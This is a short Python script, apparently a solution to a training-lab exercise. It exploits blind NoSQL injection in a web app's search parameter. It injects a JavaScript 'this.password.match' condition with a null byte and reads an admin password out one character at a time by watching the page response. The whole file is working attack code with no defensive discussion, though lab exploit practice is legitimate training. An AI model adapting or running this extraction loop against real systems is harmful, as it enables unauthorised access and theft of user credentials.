#!/usr/bin/env python3

# Methodology:
# All characters in key are lower case
# Key contains only alphabets from a - f

import requests
import string

characters = [str(i) for i in range(0,10)]
characters += [chr(i) for i in range(ord('a'), ord('g'))]
characters += '-'
print(characters)
key = ""
pos = 0
while True:

	for i in characters:
		payload= "?search=admin'%20%26%26%20this.password.match(/^{0}{1}/)%00".format(key,i)
		url = "http://ptl-66744244-644843ed.libcurl.so/" + payload
		r = requests.get(url)
		contents = r.content.decode('utf-8')
		if ">admin<" in contents:
			key += i
			pos += 1
			break
		print("Trying character: ", i, "at position", pos)

		if i == '-':
			print('Final Key: ', key)
			exit(0)
	print("Key so far = ", key)